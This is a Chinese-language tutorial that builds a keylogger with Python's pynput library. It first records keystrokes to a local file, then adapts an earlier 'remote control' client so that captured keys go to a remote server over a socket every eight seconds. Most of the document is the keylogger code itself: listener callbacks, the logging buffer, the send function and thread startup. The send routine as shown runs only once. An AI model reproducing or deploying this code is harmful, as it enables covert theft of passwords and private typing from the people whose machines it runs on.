【学习园地】简单的键盘监听

1

pynput



python的pynput库让可以控制和监控输入设备。

对于不同输入设备，pynput库使用两个子包来控制和监控输入设备：

  • pynput.mouse：包含控制和监控鼠标或者触摸板

  • pynput.keyboard：包含控制和监控键盘


那么今天训练营就带大家使用pynput库完成简单的远程键盘监听


2
本地的键盘记录


首先我们导入pynupt库下的键盘监听包

from pynput.keyboard import Key, Listener

之后创建一个键盘监听器

with Listener(on_release=on_release,on_press=on_press) as Listener:    Listener.join()

其中on_release是负责监听按下后弹起而on_press负责监听按下

之后我们建立二者对应的函数

def on_press(key):    pass

def on_release(key):    target = str(key).replace("'", "")    with open('key.txt', 'a') as f:        f.write(target + '\n')


这里我们让on_release()来记录我们的键盘操作，而on_press不做处理。

现在我们打开程序就可以完成本地的键盘监听了。


3
远程监听：服务端


对上一期远程控制的服务端进行稍微的修改，将接收单独建立一个函数，并分配一个线程

4
远程监听：被控端


对上一期远程控制的被控端进行稍微的修改，加入pynput并单独设立线程来监听并发送数据，然后单独建立一个函数负责发送监听的键盘给服务端

负责监听键盘的三函数

def on_press(key):    pass



def on_release(key):    global key_log    target = str(key).replace("'", "")    key_log = key_log + target

def linsten():    with Listener(on_release=on_release, on_press=on_press) as Listeners:        Listeners.join()

发送键盘监听的函数将所记录的键盘没过八秒发一次给服务器

def fa_key(sock):    global key_log    time.sleep(8)    sock.send(key_log.encode("UTF-8"))    key_log = ''

启动线程

listen = threading.Thread(target=linsten)listen.start()listen2 = threading.Thread(target=fa_key,args=(sock,))listen2.start()
